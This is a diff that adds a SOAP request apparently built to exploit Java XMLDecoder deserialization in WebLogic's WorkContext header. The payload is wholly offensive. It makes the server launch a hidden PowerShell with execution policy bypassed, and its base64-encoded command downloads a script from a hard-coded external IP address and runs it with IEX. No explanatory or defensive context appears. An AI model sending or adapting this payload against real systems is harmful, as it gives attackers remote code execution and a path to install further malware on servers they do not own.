@@ -1,0 +1,23 @@
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
+<soapenv:Header>
+<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
+<java version="1.8.0_131" class="java.beans.XMLDecoder">
+<void class="java.lang.ProcessBuilder">
+  <array class="java.lang.String" length="3">
+    <void index="0">
+      <string>cmd.exe</string>
+    </void>
+    <void index="1">
+      <string>/c</string>
+    </void>
+    <void index="2">
+      <string>Start PowerShell.exe -NoP -NonI -EP ByPass -W Hidden -E JABPAFMAPQAoAEcAZQB0AC0AVwBtAGkATwBiAGoAZQBjAHQAIABXAGkAbgAzADIAXwBPAHAAZQByAGEAdABpAG4AZwBTAHkAcwB0AGUAbQApAC4AQwBhAHAAdABpAG8AbgA7ACQAVwBDAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwAkAFcAQwAuAEgAZQBhAGQAZQByAHMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAIgBQAG8AdwBlAHIAUwBoAGUAbABsAC8AVwBMACAAJABPAFMAIgApADsASQBFAFgAIAAkAFcAQwAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADIAMwAuADUAOQAuADYAOAAuADEANwAyAC8AQwBhAGMAaABlAC8ARABMAC4AcABoAHAAJwApADsA</string>
+    </void>
+  </array>
+    <void method="start"/>
+</void>
+</java>
+</work:WorkContext>
+</soapenv:Header>
+<soapenv:Body/>
+</soapenv:Envelope>
